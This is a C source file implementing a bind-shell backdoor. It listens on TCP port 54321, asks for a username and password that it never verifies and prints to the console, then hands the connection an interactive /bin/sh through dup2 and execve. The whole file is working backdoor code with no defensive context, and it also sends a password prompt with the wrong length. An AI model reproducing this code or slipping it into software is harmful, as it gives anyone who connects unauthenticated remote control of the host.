#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <pwd.h>

#include <sys/socket.h>
#include <sys/types.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <netdb.h>

#include "headers/shell_fnct.h"
#include "headers/exceptions.h"
#include "headers/dump_io.h"

#define BACKLOG     5
#define TRUE        1
#define FALSE       0

int main(int argc, char ** argv){
    int sockfd, new_sockfd;
    
    socklen_t sin_size;
    
    char user[16];
    char passwd[16];
    
    int port = 54321;
    
    char * const sh[] = { "/bin/sh", NULL };
    
    struct sockaddr_in server;
    struct sockaddr_in client;
    
    
    sockfd = socket(AF_INET, SOCK_STREAM, 0);
    if(sockfd < 0){
        fatal("creating the socket");
    }
    
    server.sin_family = AF_INET;
    server.sin_port = htons(port);
    server.sin_addr.s_addr = 0;
    memset(&(server.sin_zero), '\0', 8);
    
    if(bind(sockfd, (struct sockaddr *)&server, sizeof(struct sockaddr_in)) < 0){
        fatal("binding to socket");
    }
    
    if(listen(sockfd, BACKLOG) < 0){
        fatal("listening from socket");
    }

    sin_size = sizeof(struct sockaddr_in);
    while(TRUE){
        if((new_sockfd = accept(sockfd, (struct sockaddr *)&client, &sin_size)) < 0){
            fatal("accepting connection from client");        
        }   
        printf("\n-==[!!] Got connection from addr: %s port: %d [!!]==-\n", inet_ntoa(client.sin_addr), ntohs(client.sin_port));
        send(new_sockfd, "\nUser: ", 7, 0);
        recv(new_sockfd, user, sizeof(user), 0);
        str_format(user);
        send(new_sockfd, "Password:", sizeof(passwd), 0);
        recv(new_sockfd, passwd, sizeof(passwd), 0);
        str_format(passwd);
        printf("\n[DEBUG] || user received: %s\n", user);
        printf("\n[DEBUG] || passwd received: %s\n", passwd);
        close(2); close(1); close(0);
        dup2(new_sockfd, 2);
        dup2(new_sockfd, 1);
        dup2(new_sockfd, 0);
        execve(sh[0], sh, NULL);
    }
    printf("\nFIM\n");
    
    return 0;
}




